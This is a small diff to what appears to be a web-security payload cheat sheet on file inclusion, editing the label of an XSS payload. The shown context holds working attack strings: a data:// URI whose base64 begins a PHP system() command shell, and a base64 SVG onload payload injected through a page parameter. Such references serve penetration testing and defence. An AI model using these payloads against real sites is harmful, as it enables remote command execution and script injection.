@@ -31,7 +31,7 @@ http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbW
 ```
 
 
-XSS via RFI/LFI with "<svg<svg onload=alert(1)>onload=alert(1)>" payload
+XSS via RFI/LFI with "<<svg<>svg onload=alert(1)>onload=alert(1)>" payload
 ```
 http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
 ```
